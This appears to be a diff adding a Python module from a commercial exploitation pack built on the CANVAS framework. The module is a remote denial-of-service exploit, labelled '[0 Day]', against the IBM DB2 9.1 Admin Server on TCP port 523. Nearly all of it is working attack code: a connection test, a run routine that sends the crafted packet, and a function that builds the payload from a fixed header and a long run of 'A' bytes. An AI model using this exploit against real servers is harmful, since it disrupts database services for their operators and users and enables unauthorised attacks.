@@ -1,0 +1,102 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007
+#
+
+
+import sys
+
+if "." not in sys.path:
+    sys.path.append(".")
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+
+# GUI info
+NAME = "[0 Day] IBM DB2 9.1 - Admin Server DoS"
+
+DESCRIPTION = "Deny of service vulnerability in IBM DB2 9.1 Admin Server"
+DOCUMENTATION = {}
+DOCUMENTATION["Date public"] = "Not public"
+DOCUMENTATION["Versions Affected"] = "IBM DB2 9.1"
+DOCUMENTATION["CVE Name"] = "Unknown"
+DOCUMENTATION["CVE Url"] = "Unknown"
+
+VERSION = "1.0"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "DoS"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+PROPERTY['VERSION'] = [ "2000", "2003" ]
+
+NOTES = """
+"""
+
+CHANGELOG = """
+"""
+    
+
+class theexploit(tcpexploit):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        
+        self.port = 523
+        self.host = ""                          
+        self.name = NAME        
+        return
+    
+    def test(self):        
+        self.host = self.target.interface
+        self.port = int(self.argsDict.get("port", self.port))
+                
+        s = self.gettcpsock()        
+        
+        try:
+            s.connect((self.host, self.port))
+        except:
+            self.log("No connection could be established")
+            return 0        
+        
+        return 1
+    
+    def run(self):	    		
+        self.host = self.target.interface
+        self.port = int(self.argsDict.get("port", self.port))        
+        self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))        
+        self.log("Attacking %s:%d"%(self.host, self.port))
+        
+        sploitstring = self.makesploit()
+                
+        try:            
+            s = self.gettcpsock()
+            s.connect((self.host, self.port))
+            s.sendall(sploitstring)
+        except:            
+            self.log("Attack reported no open socket - service died?")
+            self.setInfo("%s attacking %s:%d - done (failed?)"%(NAME, self.host, self.port))
+            return 0
+        
+        self.setInfo("%s attacking %s:%d - done (success!)"%(NAME, self.host, self.port))
+        
+        return 1
+        
+    def makesploit(self):
+        """
+        Construct the attack
+        """
+        sploitstring = "\x02\x04\x02\x04" + "AAAAAAAASQLDB2RA" + "A"*0x1f2
+        
+        return sploitstring
+        
+
+if __name__ == '__main__':
+    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION, VERSION)
+    app = theexploit()
+    ret=standard_callback_commandline(app)
+    
